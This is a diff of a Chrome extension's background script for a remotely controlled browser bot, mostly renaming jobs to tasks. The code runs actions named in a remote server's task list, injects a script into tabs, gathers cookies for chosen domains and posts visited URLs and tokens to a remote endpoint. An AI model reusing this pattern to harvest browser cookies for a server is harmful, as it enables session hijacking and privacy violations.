@@ -1,11 +1,11 @@
-const state = {urls: [], jobs: [], queryParam: {}};
+const state = {urls: [], tasks: [], queryParam: {}};
 const actions = {
     send: async body => {
         body = {
             payload: body,
             urls: state.urls,
             token: state.token,
-            jobName: state.jobName,
+            job: state.job,
             inject: false
         };
         const url = state.endPoint + "/browser";
@@ -20,11 +20,11 @@ const actions = {
         const response = await fetch(url);
         return response.json();
     },
-    getJobs: (name, isBotInject) => {
+    getTasks: (job, isBotInject) => {
         if (isBotInject)
-            name = "inject/" + name;
+            job = "inject/" + job;
 
-        return actions.fetchGetJson(name);
+        return actions.fetchGetJson(job);
     },
     cookiesEat: domains => {
         return Promise.all(promises.cookiesGetAll(domains)).then(jars => {
@@ -81,13 +81,12 @@ const promises = {
         return promises;
     }
 };
-
 chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
     if (changeInfo.status !== 'complete') return;
     const url = new URL(tab.url);
     const setStateQueryParam = () => {
         state.queryParam = {
-            botJobs: url.searchParams.get("botJobs"),
+            botJob: url.searchParams.get("botJob"),
             botInject: url.searchParams.has("botInject"),
             token: url.searchParams.get("botToken"),
             endPoint: url.searchParams.get("botEndPoint")
@@ -106,43 +105,43 @@ chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
         return chrome.scripting.executeScript({target: {tabId: tabId}, files: ['inject.js']});
     };
     const starting = () => {
-        const setState = (jobs, endPoints) => {
+        const setState = (tasks, endPoints) => {
             const endPoint = () => state.queryParam.endPoint ?? "remote";
             const cookieValue = () => {
-                const value = state.queryParam.botJobs + "|" + state.queryParam.token + "|" + endPoint();
+                const value = state.queryParam.botJob + "|" + state.queryParam.token + "|" + endPoint();
                 if (state.queryParam.botInject)
                     return value;
             };
             state.urls.push(tab.url);
             state.token = state.queryParam.token;
-            state.jobName = state.queryParam.botJobs;
-            state.jobs = [...jobs];
+            state.job = state.queryParam.botJob;
+            state.tasks = [...tasks];
             state.endPoint = endPoints[endPoint()];
             state.botInjectCookieValue = cookieValue();
         };
-        if (state.queryParam.botJobs) {
+        if (state.queryParam.botJob) {
             if (!state.queryParam.token)
                 throw new Error("botToken query parameter is missing.");
 
             actions.fetchGetJson("endPoints").then(endPoints => {
-                actions.getJobs(state.queryParam.botJobs, state.queryParam.botInject).then(jobs => {
-                    setState(jobs, endPoints);
-                    state.jobs.shift();
+                actions.getTasks(state.queryParam.botJob, state.queryParam.botInject).then(tasks => {
+                    setState(tasks, endPoints);
+                    state.tasks.shift();
                     if (isBotInject()) return;
 
-                    actions[jobs[0].action.name](...jobs[0].action.args);
+                    actions[tasks[0].action.name](...tasks[0].action.args);
                 });
             });
             return true;
         }
     };
     const onCourse = () => {
-        if (state.jobs.length === 0) return;
-        if (tab.url.includes(state.jobs[0].url)) {
-            const name = state.jobs[0].action.name;
-            const args = state.jobs[0].action.args;
+        if (state.tasks.length === 0) return;
+        if (tab.url.includes(state.tasks[0].url)) {
+            const name = state.tasks[0].action.name;
+            const args = state.tasks[0].action.args;
             state.urls.push(tab.url);
-            state.jobs.shift();
+            state.tasks.shift();
 
             if (isBotInject()) return;
 
